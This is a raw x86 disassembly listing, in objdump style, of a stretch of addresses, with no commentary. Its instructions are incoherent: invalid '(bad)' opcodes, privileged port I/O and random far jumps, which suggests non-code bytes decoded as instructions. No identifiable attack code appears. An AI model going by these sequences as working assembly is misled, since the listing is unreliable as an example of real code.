  42ded7:	push   eax
  42ded8:	sar    BYTE PTR [ecx],1
  42deda:	in     al,dx
  42dedb:	fimul  DWORD PTR [edx-0x4b33e865]
  42dee1:	cmp    ah,BYTE PTR [edi-0x6b]
  42dee4:	or     eax,0x158e109b
  42dee9:	daa    
  42deea:	lods   al,BYTE PTR ds:[esi]
  42deeb:	daa    
  42deec:	mov    ds:0x8bfeed00,al
  42def1:	daa    
  42def2:	mov    BYTE PTR [edx-0x8],bl
  42def5:	jno    0x42de97
  42def7:	push   0xffffffbd
  42def9:	in     al,dx
  42defa:	pop    esp
  42defb:	scas   al,BYTE PTR es:[edi]
  42defc:	(bad)  
  42defd:	jns    0x42dec4
  42deff:	in     eax,0xc9
  42df01:	pop    esp
  42df02:	fwait
  42df03:	or     DWORD PTR [ebp-0x57744128],ecx
  42df09:	icebp  
  42df0a:	inc    ecx
  42df0b:	jl     0x42df84
  42df0d:	int    0x46
  42df0f:	jne    0x42de93
  42df11:	addr16 call 0xc6152ef9
  42df17:	and    eax,ecx
  42df19:	jge    0x42deb6
  42df1b:	out    dx,al
  42df1c:	pop    eax
  42df1d:	jne    0x42df53
  42df1f:	and    BYTE PTR [ebp+0x43],dh
  42df22:	xor    DWORD PTR [ecx+ebx*1],ecx
  42df25:	cmp    cl,BYTE PTR [ecx+0x2ed9a3bc]
  42df2b:	pop    ecx
  42df2c:	add    ah,BYTE PTR [esp+ecx*2+0x7ec1a25b]
  42df33:	inc    esi
  42df34:	clc    
  42df35:	test   BYTE PTR [ebx-0x589913b],cl
  42df3b:	hlt    
  42df3c:	bound  edi,QWORD PTR ds:0xfff5f271
  42df42:	dec    edi
  42df43:	mov    eax,0x24d6eebe
  42df48:	or     eax,0x2e8274a4
  42df4d:	inc    ebp
  42df4e:	push   esi
  42df4f:	scas   al,BYTE PTR es:[edi]
  42df50:	pusha  
  42df51:	mov    ebp,0x4534c4b3
  42df56:	jbe    0x42df6f
  42df58:	jns    0x42df04
  42df5a:	outs   dx,DWORD PTR ds:[esi]
  42df5b:	lahf   
  42df5c:	pop    ebp
  42df5d:	sar    BYTE PTR [ecx+0x35],cl
  42df60:	paddw  mm0,mm0
  42df63:	rcl    bl,1
  42df65:	js     0x42df25
  42df67:	dec    ebx
  42df68:	push   ebx
  42df69:	xchg   ebp,eax
  42df6a:	adc    DWORD PTR [edi-0x16a62559],eax
  42df70:	ins    BYTE PTR es:[edi],dx
  42df71:	ins    DWORD PTR es:[edi],dx
  42df72:	jge    0x42df8c
  42df74:	icebp  
  42df75:	pop    ds
  42df76:	inc    ebp
  42df77:	sbb    ebp,ecx
  42df79:	mov    dl,0x3b
  42df7b:	sub    BYTE PTR gs:[ebx+0x4721fa36],al
  42df82:	pop    esi
  42df83:	mov    ch,0x3d
  42df85:	xchg   DWORD PTR [edx],esp
  42df87:	imul   edx,DWORD PTR [edx-0x4d],0xffffffd9
  42df8b:	mov    eax,0x3f3a7e4e
  42df90:	test   BYTE PTR [eax],al
	...
  42dff2:	add    BYTE PTR [eax],al
  42dff4:	add    bh,dh
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi-0x2b]
  42e001:	push   edi
  42e002:	scas   eax,DWORD PTR es:[edi]
  42e003:	jb     0x42e04f
  42e005:	in     eax,dx
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    eax,0x6d000001
  42e00d:	les    eax,FWORD PTR [edi+0x4c]
  42e010:	jo     0x42e08e
  42e012:	or     BYTE PTR ds:0x17b58a51,cl
  42e018:	cmp    DWORD PTR [ebx+0x4146f3b2],edx
  42e01e:	and    DWORD PTR [edx],ebx
  42e020:	out    0xd7,al
  42e022:	std    
  42e023:	or     ecx,edx
  42e025:	cdq    
  42e026:	mov    edi,0x41c7fc16
  42e02b:	push   DWORD PTR [ebp+eax*8+0x64]
  42e02f:	iret   
  42e030:	test   BYTE PTR [edi+esi*8-0x45],dl
  42e034:	pop    esi
  42e035:	(bad)  
  42e036:	xchg   ebp,eax
  42e037:	lds    eax,FWORD PTR [ebp+0x3c]
  42e03a:	sub    DWORD PTR [edi+0xa],edi
  42e03d:	jnp    0x42e063
  42e03f:	jp     0x42e086
  42e041:	pop    ebx
  42e042:	and    al,0x2
  42e044:	xchg   esp,eax
  42e045:	out    dx,al
  42e046:	ins    DWORD PTR es:[edi],dx
  42e047:	mov    esi,0xaebf9587
  42e04c:	ds inc esp
  42e04e:	mov    eax,ds:0x6b59049e
  42e053:	sahf   
  42e054:	pop    ds
  42e055:	and    eax,0xc7645b32
  42e05a:	push   edi
  42e05b:	push   esi
  42e05c:	enter  0x63ed,0x9
  42e060:	fldcw  WORD PTR [edx+0x5b]
  42e063:	rol    BYTE PTR [ecx-0x6921daee],cl
  42e069:	jmp    0x42e0e9
  42e06b:	ins    DWORD PTR es:[edi],dx
  42e06c:	mov    dl,0x8c
  42e06e:	or     eax,0x418852a6
  42e073:	jnp    0x42e0ec
  42e075:	jecxz  0x42e08a
  42e077:	mov    gs,ebx
  42e079:	sbb    BYTE PTR [edi],0x30
  42e07c:	enter  0x6825,0xa0
  42e080:	or     eax,0xdf512531
  42e085:	adc    bl,BYTE PTR [edi]
  42e087:	xor    al,0x16
  42e089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e08a:	inc    ecx
  42e08b:	retf   0x9748
  42e08e:	test   eax,0xdf02e19d
  42e093:	adc    eax,0x6905dd47
  42e098:	imul   edi,ebx,0xaf2de1cb
  42e09e:	inc    ebx
  42e09f:	jne    0x42e064
  42e0a1:	xor    al,0xbd
  42e0a3:	aas    
  42e0a4:	cdq    
  42e0a5:	and    esi,DWORD PTR [ebx]
  42e0a7:	call   FWORD PTR [ebp-0x76]
  42e0aa:	std    
  42e0ab:	push   eax
  42e0ac:	in     al,dx
  42e0ad:	jnp    0x42e091
  42e0af:	push   0xffffffb2
  42e0b1:	ins    BYTE PTR es:[edi],dx
  42e0b2:	imul   BYTE PTR [ebx+ebx*2+0xb]
  42e0b6:	push   esp
  42e0b7:	retf   
  42e0b8:	inc    edx
  42e0b9:	jge    0x42e079
  42e0bb:	jge    0x42e0a7
  42e0bd:	mov    bh,0x47
  42e0bf:	sbb    esp,ebp
  42e0c1:	jecxz  0x42e097
  42e0c3:	bnd jge 0x42e069
  42e0c6:	retf   0xd976
  42e0c9:	test   BYTE PTR [edi],bl
  42e0cb:	xor    dh,dl
  42e0cd:	push   eax
  42e0ce:	cdq    
  42e0cf:	sub    bh,0x2a
  42e0d2:	fsub   st(4),st
  42e0d4:	sbb    ah,al
  42e0d6:	cmp    eax,ebp
  42e0d8:	pop    esi
  42e0d9:	pushf  
  42e0da:	loope  0x42e08c
  42e0dc:	xor    al,0xf
  42e0de:	sub    DWORD PTR [esi],ebx
  42e0e0:	add    bl,BYTE PTR [eax]
  42e0e2:	sar    BYTE PTR [ebp+ecx*8-0x7decc4f8],1
  42e0e9:	bound  ecx,QWORD PTR [ebx-0x52e5c97c]
  42e0ef:	adc    esp,DWORD PTR [ebp-0x2fb1cba1]
  42e0f5:	add    ecx,DWORD PTR [esi+0x14]
  42e0f8:	rcl    DWORD PTR [ecx-0x25],cl
  42e0fb:	bound  edx,QWORD PTR [ebx+0x1f]
  42e0fe:	or     BYTE PTR [ebx+ebp*8],ch
  42e101:	call   0xeee8:0xf2615f20
  42e108:	icebp  
  42e109:	mov    bh,BYTE PTR [edx]
  42e10b:	mov    al,0xd1
  42e10d:	imul   ebx,DWORD PTR [ecx+0x87b9],0x0
	...
  42e173:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	mov    WORD PTR [edi-0x11b0c5d1],ss
  42e186:	add    DWORD PTR [eax],eax
  42e188:	add    eax,0x13000001
  42e18d:	pop    esp
  42e18e:	sub    eax,0x479ad24d
  42e193:	sar    DWORD PTR ds:0x99bb8eb6,cl
  42e199:	mov    ch,cl
  42e19b:	push   0x89dbb0d9
  42e1a0:	into   
  42e1a1:	or     dh,BYTE PTR [edx+0x72]
  42e1a4:	add    dh,BYTE PTR [edi+0x18d2b182]
  42e1aa:	xchg   edi,eax
  42e1ab:	scas   eax,DWORD PTR es:[edi]
  42e1ac:	ins    DWORD PTR es:[edi],dx
  42e1ad:	dec    edi
  42e1ae:	leave  
  42e1af:	cli    
  42e1b0:	jbe    0x42e1c8
  42e1b2:	fcomp  QWORD PTR [esi+0x2370ba96]
  42e1b8:	jg     0x42e1a7
  42e1ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e1bb:	push   ebx
  42e1bc:	stos   BYTE PTR es:[edi],al
  42e1bd:	or     DWORD PTR [eax],eax
  42e1bf:	fist   DWORD PTR [edx]
  42e1c1:	sbb    eax,0x366b48bb
  42e1c6:	outs   dx,DWORD PTR ds:[esi]
  42e1c7:	in     al,0xab
  42e1c9:	scas   eax,DWORD PTR es:[edi]
  42e1ca:	test   eax,0xc3f177d6
  42e1cf:	jle    0x42e1fe
  42e1d1:	xchg   esp,eax
  42e1d2:	cli    
  42e1d3:	mov    ebp,DWORD PTR [edi+ecx*8]
  42e1d6:	out    dx,eax
  42e1d7:	icebp  
  42e1d8:	ret    0xe2ee
  42e1db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e1dc:	pop    esp
  42e1dd:	xor    al,0xee
  42e1df:	retf   0xbc6d
  42e1e2:	out    dx,eax
  42e1e3:	push   edx
  42e1e4:	xrelease mov DWORD PTR [edx+0x60],eax
  42e1e8:	cmc    
  42e1e9:	mov    ecx,0x71fa98fb
  42e1ee:	xchg   esi,eax
  42e1ef:	rcr    BYTE PTR [esi+edx*8+0x4374b940],1
  42e1f6:	cli    
  42e1f7:	cmp    ch,BYTE PTR [eax+0x36]
  42e1fa:	mov    ah,0x52
  42e1fc:	or     eax,0x65aca44e
  42e201:	sbb    eax,0x56b1f7a4
  42e206:	hlt    
  42e207:	jnp    0x42e1f6
  42e209:	lds    ebp,FWORD PTR [eax]
  42e20b:	add    eax,0xc9500561
  42e210:	sbb    al,0x8
  42e212:	mov    esp,0x9e69e1f6
  42e217:	and    ebp,DWORD PTR ds:0x4e2b3f88
  42e21d:	jbe    0x42e24b
  42e21f:	fcmovnbe st,st(6)
  42e221:	sub    al,0xa2
  42e223:	popa   
  42e224:	fild   WORD PTR [ebx-0x5c3bdac8]
  42e22a:	ins    DWORD PTR es:[edi],dx
  42e22b:	cdq    
  42e22c:	shl    edi,cl
  42e22e:	mov    ecx,DWORD PTR [edi]
  42e230:	ins    BYTE PTR es:[edi],dx
  42e231:	(bad)
  42e234:	rcr    BYTE PTR [esi+edx*2],cl
  42e237:	push   ebx
  42e238:	aas    
  42e239:	mov    esp,0x76db0c7
  42e23e:	pop    esi
  42e23f:	dec    esp
  42e240:	and    eax,0x28d5c2cf
  42e245:	jp     0x42e2c5
  42e247:	cmp    al,0xbd
  42e249:	test   DWORD PTR [edx],esp
  42e24b:	cmc    
  42e24c:	xchg   edx,eax
  42e24d:	loopne 0x42e22d
  42e24f:	mov    cl,0x2c
  42e251:	sbb    ebx,eax
  42e253:	retf   
  42e254:	out    0xfd,al
  42e256:	js     0x42e1d8
  42e258:	push   esi
  42e259:	mov    bl,0x7f
  42e25b:	scas   eax,DWORD PTR es:[edi]
  42e25c:	jae    0x42e260
  42e25e:	scas   al,BYTE PTR es:[di]
  42e260:	mov    ds:0x54a99bc6,eax
  42e265:	mov    edx,0x5cea5149
  42e26a:	jge    0x42e247
  42e26c:	nop
  42e26d:	mov    eax,ds:0x660a6f72
  42e272:	jno    0x42e268
  42e274:	retf   0xd3aa
  42e277:	mov    ah,0x6f
  42e279:	rcl    BYTE PTR [ebp-0x6a5bcc03],1
  42e27f:	sub    eax,0x80752c29
  42e284:	jae    0x42e2da
  42e286:	add    edi,edx
  42e288:	or     al,0x6
  42e28a:	jo     0x42e232
  42e28c:	xchg   ecx,eax
  42e28d:	xchg   ebp,eax
  42e28e:	fcom   DWORD PTR [edi]
  42e290:	fadd   DWORD PTR [eax]
	...
  42e2f2:	add    BYTE PTR [eax],al
  42e2f4:	lods   eax,DWORD PTR ds:[esi]
  42e2f5:	cmp    eax,0xb79aa78a
  42e2fa:	lods   eax,DWORD PTR ds:[esi]
  42e2fb:	aas    
  42e2fc:	mov    ebx,0xe0199140
  42e301:	or     ebp,ecx
  42e303:	call   0x105:0x1ef54
  42e30a:	add    BYTE PTR [eax],al
  42e30c:	stos   DWORD PTR es:[edi],eax
  42e30d:	aad    0x84
  42e30f:	adc    al,0x60
  42e311:	adc    edx,DWORD PTR [esi]
  42e313:	aam    0xfc
  42e315:	iret   
  42e316:	retf   0x97c3
  42e319:	loop   0x42e2ee
  42e31b:	push   ebp
  42e31c:	mov    edi,0x65c6950e
  42e321:	mov    ebx,ebx
  42e323:	(bad)
  42e326:	jle    0x42e370
  42e328:	mov    ebx,DWORD PTR [ebx]
  42e32a:	int3   
  42e32b:	popa   
  42e32c:	xor    al,0x58
  42e32e:	mov    esp,DWORD PTR [ebp+eax*1-0x6e7c58b0]
  42e335:	addr16 mov ch,0xe7
  42e338:	pop    ebp
  42e339:	dec    edx
  42e33a:	jns    0x42e323
  42e33c:	dec    eax
  42e33d:	sub    al,0x6b
  42e33f:	and    DWORD PTR [ebp-0x736c76af],edx
  42e345:	adc    al,BYTE PTR [esi-0x451882be]
  42e34b:	and    BYTE PTR [ecx+edx*2-0x24949303],ah
  42e352:	(bad)  
  42e353:	jnp    0x42e384
  42e355:	and    eax,0xf432813e
  42e35a:	pop    ecx
  42e35b:	pop    es
  42e35c:	call   0xb73b:0x297f6b05
  42e363:	int3   
  42e364:	jp     0x42e3d9
  42e366:	push   eax
  42e367:	imul   DWORD PTR [ecx]
  42e369:	std    
  42e36a:	jne    0x42e3b1
  42e36c:	in     al,0xce
  42e36e:	mov    bh,0xb
  42e370:	xor    eax,DWORD PTR [esp+ebx*4+0x4d]
  42e374:	sbb    ebp,DWORD PTR ds:0x69ec81c9
  42e37a:	add    edx,DWORD PTR [eax]
  42e37c:	jns    0x42e3bb
  42e37e:	es cwde 
  42e380:	in     eax,dx
  42e381:	fild   WORD PTR ds:0xb2acf375
  42e387:	push   ebp
  42e388:	mov    al,dh
  42e38a:	cmp    bh,0x3
  42e38d:	(bad)  
  42e38e:	sbb    al,0x4e
  42e390:	repz pop ebp
  42e392:	and    al,0x18
  42e394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e395:	mov    dh,0x13
  42e397:	out    0xa6,eax
  42e399:	mov    edi,DWORD PTR [edi+0x56f38775]
  42e39f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e3a0:	int3   
  42e3a1:	fisttp DWORD PTR [edi*4+0x66028482]
  42e3a8:	inc    eax
  42e3a9:	loope  0x42e353
  42e3ab:	jle    0x42e37f
  42e3ad:	dec    ebp
  42e3ae:	lea    ebp,[edx-0x47]
  42e3b1:	and    BYTE PTR [edi+0x79],cl
  42e3b4:	mov    bl,0xe0
  42e3b6:	gs mov gs,esi
  42e3b9:	hlt    
  42e3ba:	ret    
  42e3bb:	dec    esi
  42e3bc:	shr    BYTE PTR [edx],0xee
  42e3bf:	push   ecx
  42e3c0:	test   al,0x9c
  42e3c2:	test   eax,0x95aaa878
  42e3c7:	sub    eax,0x68eaeaa2
  42e3cc:	imul   esi,DWORD PTR [edi+0x9],0x44e9da32
  42e3d3:	mov    eax,ds:0x836072e1
  42e3d8:	inc    edx
  42e3d9:	(bad)  
  42e3da:	loope  0x42e453
  42e3dc:	jno    0x42e3e6
  42e3de:	int    0x13
  42e3e0:	mov    ebx,0xba4b6082
  42e3e5:	mov    ds,WORD PTR [edx]
  42e3e7:	mov    esi,0xfc3b8d98
  42e3ec:	test   eax,0xb4eb9b11
  42e3f1:	int3   
  42e3f2:	add    eax,0x14c279f8
  42e3f7:	sbb    al,0xc0
  42e3f9:	mov    al,ds:0xeca2bf29
  42e3fe:	dec    ebx
  42e3ff:	and    ah,ah
  42e401:	gs sub al,ch
  42e404:	cmp    eax,DWORD PTR [edi+0x40]
  42e407:	push   edx
  42e408:	add    DWORD PTR [esi],ecx
  42e40a:	lds    eax,FWORD PTR [eax-0x59]
  42e40d:	mov    esp,0x384c60
	...
  42e472:	add    BYTE PTR [eax],al
  42e474:	loop   0x42e433
  42e476:	fadd   st(7),st
  42e478:	(bad)  
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	push   ds
  42e481:	xchg   DWORD PTR [edi+0x42],ebx
  42e484:	pop    ecx
  42e485:	lock add DWORD PTR [eax],eax
  42e488:	add    eax,0x39000001
  42e48d:	pop    esp
  42e48e:	das    
  42e48f:	(bad)
  42e492:	retf   0x29fa
  42e495:	aam    0x90
  42e497:	outs   dx,BYTE PTR ds:[esi]
  42e498:	sti    
  42e499:	mov    al,0x2c
  42e49b:	stos   BYTE PTR es:[edi],al
  42e49c:	add    eax,0xa25cf5f5
  42e4a1:	test   eax,0x1c43e2cc
  42e4a6:	cld    
  42e4a7:	jle    0x42e457
  42e4a9:	(bad)  
  42e4aa:	bound  eax,QWORD PTR ds:[esi-0x6e]
  42e4ae:	fld    TBYTE PTR [ebx]
  42e4b0:	daa    
  42e4b1:	xchg   ecx,eax
  42e4b2:	mov    ah,0xbb
  42e4b4:	nop
  42e4b5:	xor    al,BYTE PTR [ecx]
  42e4b7:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e4b9:	mov    ecx,DWORD PTR [ebx-0x66dba5a8]
  42e4bf:	sti    
  42e4c0:	test   al,0xcb
  42e4c2:	sbb    eax,0x37385f64
  42e4c7:	pop    es
  42e4c8:	stc    
  42e4c9:	mov    ch,0x19
  42e4cb:	jmp    0xa8aa677a
  42e4d0:	(bad)  
  42e4d1:	sub    eax,0x5987ee3e
  42e4d6:	mov    esp,ebp
  42e4d8:	std    
  42e4d9:	dec    edi
  42e4da:	shl    BYTE PTR [edx-0x26],0x26
  42e4de:	mov    eax,ds:0x87c6416c
  42e4e3:	(bad)  
  42e4e4:	outs   dx,BYTE PTR ds:[esi]
  42e4e5:	pop    eax
  42e4e6:	fisttp DWORD PTR [edx]
  42e4e8:	jge    0x42e509
  42e4ea:	clc    
  42e4eb:	cdq    
  42e4ec:	xchg   edi,eax
  42e4ed:	(bad)  
  42e4ee:	xor    ebx,DWORD PTR [eax+0x14ad0c1a]
  42e4f4:	dec    edi
  42e4f5:	int3   
  42e4f6:	(bad)  
  42e4f7:	loope  0x42e4fe
  42e4f9:	out    0x29,al
  42e4fb:	sbb    al,0xc
  42e4fd:	std    
  42e4fe:	jl     0x42e503
  42e500:	jae    0x42e53c
  42e502:	add    eax,0xffe0221d
  42e507:	(bad)  
  42e509:	ja     0x42e55c
  42e50b:	xchg   esp,eax
  42e50c:	mov    bl,0x1a
  42e50e:	js     0x42e4ec
  42e510:	mov    ch,0xe6
  42e512:	mov    eax,ds:0x2dced616
  42e517:	popf   
  42e518:	jge    0x42e550
  42e51a:	imul   edx,esi,0xaa250ecc
  42e520:	adc    dl,ch
  42e522:	test   al,0x5a
  42e524:	and    ch,BYTE PTR [eax]
  42e526:	sub    BYTE PTR [esi],bh
  42e528:	test   DWORD PTR [ebx-0x74],0x9de48b33
  42e52f:	into   
  42e530:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e531:	jno    0x42e4ea
  42e533:	js     0x42e501
  42e535:	jno    0x42e572
  42e537:	inc    ecx
  42e538:	fcomp  DWORD PTR [eax-0x146d85ff]
  42e53e:	cmp    DWORD PTR [eax+0x61],ebx
  42e541:	ss jl  0x42e551
  42e544:	sub    DWORD PTR [edi-0x2e42274d],esp
  42e54a:	fnstsw WORD PTR [eax-0x43]
  42e54d:	mov    edi,0xd143e543
  42e552:	(bad)  
  42e553:	fdiv   st(2),st
  42e555:	add    DWORD PTR [ebp+0x23],ebp
  42e558:	mov    ds:0x82f1de5a,al
  42e55d:	dec    eax
  42e55e:	in     al,0x12
  42e560:	cmp    eax,0x1a99bb3e
  42e565:	shr    BYTE PTR [ebx],cl
  42e567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e568:	neg    DWORD PTR [ebx]
  42e56a:	mov    bl,0xb4
  42e56c:	gs int3 
  42e56e:	jp     0x42e5ab
  42e570:	xchg   esp,eax
  42e571:	jg     0x42e59a
  42e573:	mov    edx,0x5695aca0
  42e578:	dec    ebx
  42e579:	jns    0x42e57a
  42e57b:	jmp    0xf8808c5c
  42e580:	xchg   edi,eax
  42e581:	mov    cl,0x94
  42e583:	cli    
  42e584:	sar    DWORD PTR [ebx+ebx*1],1
  42e587:	or     ebp,DWORD PTR [edx]
  42e589:	leave  
  42e58a:	mov    eax,0xf3409c3a
  42e58f:	retf   
  42e590:	mov    eax,0x0
	...
  42e5f1:	add    BYTE PTR [eax],al
  42e5f3:	add    BYTE PTR [ebp+0x38],dl
  42e5f6:	into   
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	retf   0xdf39
  42e603:	das    
  42e604:	pop    esi
  42e605:	icebp  
  42e606:	add    DWORD PTR [eax],eax
  42e608:	add    eax,0x34000001
  42e60d:	push   esp
  42e60e:	retf   0x99cb
  42e611:	hlt    
  42e612:	jno    0x42e5b0
  42e614:	cld    
  42e615:	mov    ds:0x8de591d,eax
  42e61a:	or     BYTE PTR [ecx],bl
  42e61c:	mov    al,ds:0xc1f6a8f5
  42e621:	scas   eax,DWORD PTR es:[edi]
  42e622:	xor    cl,al
  42e624:	push   ds
  42e625:	lahf   
  42e626:	enter  0xaf50,0x43
  42e62a:	adc    edx,edx
  42e62c:	out    dx,eax
  42e62d:	hlt    
  42e62e:	cmp    ch,BYTE PTR [esi+0x33]
  42e631:	or     eax,0xf330c646
  42e636:	pop    edi
  42e637:	lahf   
  42e638:	jno    0x42e638
  42e63a:	gs push ss
  42e63c:	pop    esi
  42e63d:	mov    ebp,0xceb578e4
  42e642:	pushf  
  42e643:	push   ecx
  42e644:	jne    0x42e5e6
  42e646:	xor    eax,0xdd76a7b5
  42e64b:	dec    eax
  42e64c:	into   
  42e64d:	and    esi,ebp
  42e64f:	loope  0x42e636
  42e651:	(bad)  
  42e652:	nop
  42e653:	stc    
  42e654:	(bad)  
  42e655:	fild   DWORD PTR [eax-0x78]
  42e658:	popa   
  42e659:	cmp    DWORD PTR [ebp-0x74],ecx
  42e65c:	or     DWORD PTR [ecx],esp
  42e65e:	xor    al,0xdd
  42e660:	loop   0x42e6df
  42e662:	mov    ch,0xc3
  42e664:	clc    
  42e665:	or     al,bl
  42e667:	sub    al,0xdb
  42e669:	sub    bl,BYTE PTR [ebx+0x73]
  42e66c:	fisub  WORD PTR [ebp+0x7a]
  42e66f:	sub    edi,DWORD PTR [ebp+0x3cf54e45]
  42e675:	aam    0xf8
  42e677:	fnstsw WORD PTR [ecx-0x13764a76]
  42e67d:	cdq    
  42e67e:	xor    DWORD PTR [esi+0x30075c5b],edx
  42e684:	enter  0x41fc,0x4c
  42e688:	sbb    al,0x2e
  42e68a:	aam    0x27
  42e68c:	push   esi
  42e68d:	jge    0x42e61c
  42e68f:	lods   al,BYTE PTR cs:[esi]
  42e691:	xchg   DWORD PTR [eax],eax
  42e693:	fidiv  WORD PTR [esi]
  42e695:	ins    BYTE PTR es:[edi],dx
  42e696:	sub    DWORD PTR [ebx-0x4d374331],edi
  42e69c:	repz out 0x86,eax
  42e69f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e6a0:	xchg   esi,eax
  42e6a1:	add    edx,DWORD PTR [eax-0x42]
  42e6a4:	jmp    0x42e68b
  42e6a6:	inc    esp
  42e6a7:	in     eax,dx
  42e6a8:	mov    ebx,0x96df11d3
  42e6ad:	and    ebx,DWORD PTR [ebx+ecx*4+0x1]
  42e6b1:	je     0x42e700
  42e6b3:	sar    BYTE PTR [edx+0x6a485df7],0xc1
  42e6ba:	cld    
  42e6bb:	std    
  42e6bc:	jg     0x42e705
  42e6be:	pusha  
  42e6bf:	js     0x42e6da
  42e6c1:	sbb    eax,0x748018be
  42e6c6:	add    eax,0x3246dc72
  42e6cb:	jb     0x42e6d8
  42e6cd:	addr16 pop esi
  42e6cf:	mov    ds:0x719dfa51,eax
  42e6d4:	fild   WORD PTR [ebx]
  42e6d6:	fbld   TBYTE PTR [esi+0x616a4c04]
  42e6dc:	cmp    ah,cl
  42e6de:	xlat   BYTE PTR ds:[ebx]
  42e6df:	mov    dh,0xf9
  42e6e1:	lea    eax,[edx+edx*8]
  42e6e4:	add    al,BYTE PTR [eax]
  42e6e6:	hlt    
  42e6e7:	icebp  
  42e6e8:	xchg   esi,eax
  42e6e9:	rcr    esi,1
  42e6eb:	clc    
  42e6ec:	(bad)  
  42e6ed:	mov    cl,0xa1
  42e6ef:	test   DWORD PTR [ecx+0x41],esi
  42e6f2:	repz hlt 
  42e6f4:	pop    ss
  42e6f5:	mov    esi,0xd08d8e8c
  42e6fa:	dec    edx
  42e6fb:	(bad)  
  42e6fd:	out    0x1b,al
  42e6ff:	test   edx,edx
  42e701:	scas   eax,DWORD PTR es:[edi]
  42e702:	inc    esi
  42e703:	adc    DWORD PTR [edi-0x3ed92a5f],esi
  42e709:	mov    bl,0xc4
  42e70b:	in     al,0xbe
  42e70d:	cmp    DWORD PTR ss:0x33,ebp
	...
  42e774:	pop    edx
  42e775:	cmp    DWORD PTR [esi+0x2d],ecx
  42e778:	outs   dx,DWORD PTR ds:[esi]
  42e779:	jg     0x42e7f6
  42e77b:	jg     0x42e7e1
  42e77d:	sub    BYTE PTR [esi],cl
  42e77f:	fidivr DWORD PTR [edx]
  42e781:	sub    eax,0xf2639270
  42e786:	add    DWORD PTR [eax],eax
  42e788:	add    eax,0xcd000001
  42e78d:	inc    esi
  42e78e:	dec    esi
  42e78f:	and    ebx,DWORD PTR [ebx+0x7f]
  42e792:	pop    esp
  42e793:	sub    eax,0xe7f912c1
  42e798:	iret   
  42e799:	cmp    DWORD PTR [ebx],ecx
  42e79b:	xchg   ebx,eax
  42e79c:	fcomp  QWORD PTR [ebx]
  42e79e:	pop    edi
  42e79f:	xchg   DWORD PTR [edi-0x6d],eax
  42e7a2:	lahf   
  42e7a3:	cmp    al,0xfd
  42e7a5:	add    esp,eax
  42e7a7:	inc    esi
  42e7a8:	mov    esp,0x7765524b
  42e7ad:	aaa    
  42e7ae:	fnstcw WORD PTR [ebx]
  42e7b0:	mov    ah,0xb0
  42e7b2:	or     DWORD PTR [eax-0x48],esp
  42e7b5:	push   ecx
  42e7b6:	int    0xe2
  42e7b8:	sub    bh,BYTE PTR ds:0xc468db0b
  42e7be:	cmp    BYTE PTR [esp+esi*2-0x47],ah
  42e7c2:	sub    eax,0x9932b112
  42e7c7:	je     0x42e812
  42e7c9:	and    ah,bh
  42e7cb:	(bad)  
  42e7cc:	mov    edi,0xfd306bcf
  42e7d1:	mov    ch,0x95
  42e7d3:	shl    DWORD PTR [esi*4+0x7e6bfca],cl
  42e7da:	loope  0x42e778
  42e7dc:	cmp    cl,BYTE PTR [ecx-0x40faf8a9]
  42e7e2:	dec    ebp
  42e7e3:	mov    cl,0x3c
  42e7e5:	scas   eax,DWORD PTR es:[edi]
  42e7e6:	jge    0x42e7e6
  42e7e8:	or     esi,ecx
  42e7ea:	dec    eax
  42e7eb:	pop    esp
  42e7ec:	add    BYTE PTR [ebx-0x54cea2f5],cl
  42e7f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e7f3:	add    BYTE PTR [ebx],al
  42e7f5:	xchg   esi,eax
  42e7f6:	inc    ebp
  42e7f7:	clc    
  42e7f8:	jns    0x42e838
  42e7fa:	pop    edi
  42e7fb:	cld    
  42e7fc:	jmp    0x42e808
  42e7fe:	jle    0x42e837
  42e800:	mov    WORD PTR [esi+0x7311f7da],?
  42e806:	iret   
  42e807:	mov    dh,0x63
  42e809:	pop    ecx
  42e80a:	mov    ds:0xfeb92870,eax
  42e80f:	mov    ds:0xebfb38de,eax
  42e814:	push   esp
  42e815:	sti    
  42e816:	test   al,0x97
  42e818:	loop   0x42e86b
  42e81a:	xchg   ebx,eax
  42e81b:	cmp    eax,0x46b3e505
  42e820:	shr    DWORD PTR [edi+0x4d],1
  42e823:	xchg   BYTE PTR [ebx-0x38bc566d],bl
  42e829:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e82a:	cli    
  42e82b:	push   ebx
  42e82c:	aas    
  42e82d:	adc    BYTE PTR [eax-0x7f],bh
  42e830:	out    dx,al
  42e831:	jmp    0xbea1:0x911ffe05
  42e838:	pushf  
  42e839:	push   ds
  42e83a:	mov    ah,0xd6
  42e83c:	retf   
  42e83d:	xor    DWORD PTR [ebx+0x93ad586],esi
  42e843:	jae    0x42e8ad
  42e845:	xchg   esi,eax
  42e846:	rcr    DWORD PTR [ecx+0x60],1
  42e849:	cs jg  0x42e80e
  42e84c:	xchg   ebx,eax
  42e84d:	iret   
  42e84e:	jmp    0xf60cb760
  42e853:	mov    dl,0xe8
  42e855:	mov    ah,0xef
  42e857:	or     eax,0x5a578bed
  42e85c:	out    dx,eax
  42e85d:	cli    
  42e85e:	ret    0x34e0
  42e861:	cmp    eax,0xf08b7ed
  42e866:	xchg   esp,edx
  42e868:	or     DWORD PTR [edi+0x6],esi
  42e86b:	ds push ecx
